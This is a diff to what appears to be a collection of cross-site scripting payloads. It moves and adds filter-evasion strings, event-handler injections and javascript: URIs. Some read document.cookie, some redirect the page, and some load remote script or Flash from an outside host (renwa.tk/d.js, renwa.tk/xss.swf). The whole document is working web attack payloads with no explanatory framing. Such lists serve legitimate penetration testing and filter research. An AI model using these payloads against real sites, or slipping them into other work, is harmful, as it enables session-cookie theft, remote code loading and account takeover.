@@ -15,6 +15,8 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 <a/onmousemove=alert(1)//>renwax23
 
+<object%20allowscriptaccess=always>%20<param%20name=code%20value=http://renwa.tk/xss.swf>
+
 <svg+onload=eval(location.hash.substr(1))>#alert(1)
 
 <button onmousemove="javascript:alert(1)">renwa
@@ -44,8 +46,6 @@ i\{\<\/\s\t\y\le\>\<\i\m\g\20\o\ne\r\r\o\r\=\'a\le\r\t\(d\oc\u\me\nt\.c\o\o\kie\
 <img/src=q onerror='new Function`al\ert\`OPENBUGBOUNTY\``'>
 
 <Html Onmouseover=(alert)(1) //
-
-<object%20allowscriptaccess=always>%20<param%20name=code%20value=http://renwa.tk/xss.swf>
 
 <script src=http://renwa.tk/d.js></script>
 
@@ -165,17 +165,30 @@ x%22%3E%3Cimg%20src=%22x%22%3E%3C!--%2522%2527--%253E%253CSvg%2520O%256ELoad%253
 
 <input onfocus=alert(1337) </autofocus>
 
+
+
+javascript:alert(1)
+
+javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")
+
+javascript://%250Aalert(document.cookie)
+
 javascripT://https://google.com%0aalert(1);//https://google.com
 
 /x:1/:///%01javascript:alert(document.cookie)/
 
-" onclick=alert(1)//">click</a> 
+
+
+" onclick=alert(1)//">click
 
 " autofocus onfocus=alert(1) "
 
 " onfocus=prompt(1) autofocus fragment="
 
 " onmouseover="confirm(1)"style="position:absolute;width:100%;height:100%;top:0;left:0;"
+
+
+'?prompt`1`?'
 
 "])},alert(1));(function xss() {//
 
